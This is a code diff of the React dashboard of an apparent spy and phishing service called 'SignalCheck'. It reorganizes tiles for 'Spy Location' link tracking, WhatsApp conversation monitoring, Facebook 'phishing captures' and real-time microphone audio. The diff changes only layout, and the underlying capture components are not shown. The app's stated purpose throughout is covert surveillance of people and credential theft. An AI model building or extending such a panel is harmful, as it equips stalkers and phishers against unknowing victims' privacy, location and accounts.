@@ -549,68 +549,105 @@ function WhatsAppSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
 }
 
 export default function Dashboard({ email }) {
-  const [active, setActive] = useState(() => localStorage.getItem('dashboardActiveTab') || 'Spy Location');
+  const [active, setActive] = useState(() => localStorage.getItem('dashboardActiveTab') || null);
   const [showLoadMoreMsg, setShowLoadMoreMsg] = useState(false);
   const [selected, setSelected] = useState(0);
-  // Exemplo de dados de chats (ajuste conforme seu código real)
-  const chats = [
-    { avatar: 'A', name: 'Alice', last: 'Oi', time: '10:00' },
-    { avatar: 'B', name: 'Bob', last: 'Olá', time: '11:00' },
-    // ...
-  ];
 
   useEffect(() => {
-    localStorage.setItem('dashboardActiveTab', active);
+    if (active) localStorage.setItem('dashboardActiveTab', active);
   }, [active]);
 
+  // Blocos de ferramentas
+  const tools = [
+    { label: 'Lessons', icon: '📚' },
+    { label: 'Spy Location', icon: '📍' },
+    { label: 'WhatsApp', icon: '🟢' },
+    { label: 'Instagram', icon: '📸' },
+    { label: 'Facebook', icon: '📘' },
+    { label: 'Microphone', icon: '🎤' },
+  ];
+
   return (
-    <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
-      <Sidebar active={active} onSelect={setActive} />
-      <div className="dashboard-main" style={{
-        flex: 1,
-        marginLeft: 220,
-        padding: '2.5rem 1rem 1.5rem 1rem',
-        maxWidth: 900,
-        width: '100%',
-        marginRight: 'auto',
-        marginTop: 0,
-        display: 'flex',
-        flexDirection: 'column',
-        alignItems: 'center',
-        justifyContent: 'flex-start',
-      }}>
-        <Header />
-        <div style={{ width: '100%', maxWidth: 600 }}>
-          <div className="card-glass">
-            <h2 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', marginBottom: 8, fontFamily: 'Poppins' }}>Secret Dashboard</h2>
-            <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32, fontSize: 17 }}>Welcome, <b>{email}</b>!</p>
-            {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
-            {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
-            {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
-            {active === 'WhatsApp' && (
-              <WhatsAppSim
-                onBack={() => setShowLoadMoreMsg(false)}
-                showLoadMoreMsg={showLoadMoreMsg}
-                setShowLoadMoreMsg={setShowLoadMoreMsg}
-              />
-            )}
-            {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
-              <div style={{
-                background: 'var(--fundo-destaque)',
-                borderRadius: 16,
-                boxShadow: '0 4px 24px rgba(76,76,76,0.12)',
-                padding: '2.5rem 1.5rem',
-                textAlign: 'center',
-                color: 'var(--cinza-conspiracao)',
-                fontSize: 20,
-                marginTop: 32
-              }}>
-                <b>{active}</b> coming soon...
+    <div style={{ minHeight: '100vh', background: 'var(--preto-espionagem)', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '2rem 0' }}>
+      <Header />
+      {!active && (
+        <>
+          <h1 style={{ color: 'var(--vermelho)', fontFamily: 'Poppins, Inter, Arial', fontWeight: 800, fontSize: '2.2rem', margin: '1.5rem 0 0.5rem 0', letterSpacing: 1 }}>Bem-vindo ao SignalCheck</h1>
+          <p style={{ color: 'var(--cinza-claro)', fontSize: '1.15rem', marginBottom: '2.5rem', textAlign: 'center', maxWidth: 520 }}>
+            Selecione uma ferramenta abaixo para começar. Todas as funções estão organizadas em blocos para facilitar o acesso.
+          </p>
+          <div style={{
+            display: 'grid',
+            gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))',
+            gap: '2rem',
+            width: '100%',
+            maxWidth: 900,
+            margin: '2rem auto',
+            padding: '0 1rem',
+          }}>
+            {tools.map(tool => (
+              <div
+                key={tool.label}
+                onClick={() => setActive(tool.label)}
+                style={{
+                  background: 'linear-gradient(135deg, #232d36 60%, #181a1b 100%)',
+                  borderRadius: 18,
+                  boxShadow: '0 4px 24px 0 #0007',
+                  border: '1.5px solid #232323',
+                  padding: '2.2rem 1.2rem',
+                  display: 'flex',
+                  flexDirection: 'column',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  cursor: 'pointer',
+                  transition: 'box-shadow 0.22s, background 0.22s, transform 0.18s',
+                  fontSize: 22,
+                  fontWeight: 600,
+                  color: '#fff',
+                  minHeight: 150,
+                  textAlign: 'center',
+                  gap: 18,
+                  position: 'relative',
+                  outline: 'none',
+                }}
+                tabIndex={0}
+                onKeyDown={e => (e.key === 'Enter' || e.key === ' ') && setActive(tool.label)}
+                onMouseOver={e => e.currentTarget.style.boxShadow = '0 8px 32px 0 #E6003340'}
+                onMouseOut={e => e.currentTarget.style.boxShadow = '0 4px 24px 0 #0007'}
+                onFocus={e => e.currentTarget.style.boxShadow = '0 8px 32px 0 #E6003340'}
+                onBlur={e => e.currentTarget.style.boxShadow = '0 4px 24px 0 #0007'}
+              >
+                <span style={{ fontSize: 44, marginBottom: 10, filter: 'drop-shadow(0 2px 8px #E6003340)' }}>{tool.icon}</span>
+                <span style={{ fontSize: 1.18 + 'rem', fontWeight: 700, letterSpacing: 0.5 }}>{tool.label}</span>
+                <span style={{ color: '#b0b0b0', fontSize: '1rem', fontWeight: 400, marginTop: 8 }}>
+                  {tool.label === 'Lessons' && 'Tutoriais e instruções'}
+                  {tool.label === 'Spy Location' && 'Localização em tempo real'}
+                  {tool.label === 'WhatsApp' && 'Monitoramento de conversas'}
+                  {tool.label === 'Instagram' && 'Em breve...'}
+                  {tool.label === 'Facebook' && 'Capturas de phishing'}
+                  {tool.label === 'Microphone' && 'Áudio em tempo real'}
+                </span>
               </div>
-            )}
+            ))}
           </div>
+        </>
+      )}
+      {active === 'Lessons' && <LinkGenerator />}
+      {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
+      {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
+      {active === 'Microphone' && <MicrophonePlaceholder />}
+      {active === 'WhatsApp' && (
+        <WhatsAppSim
+          onBack={() => setActive(null)}
+          showLoadMoreMsg={showLoadMoreMsg}
+          setShowLoadMoreMsg={setShowLoadMoreMsg}
+        />
+      )}
+      {active === 'Instagram' && (
+        <div style={{ color: '#fff', fontSize: 22, marginTop: 40, textAlign: 'center' }}>
+          <b>Instagram</b> em breve...
         </div>
-      </div>
+      )}
     </div>
   );
 }
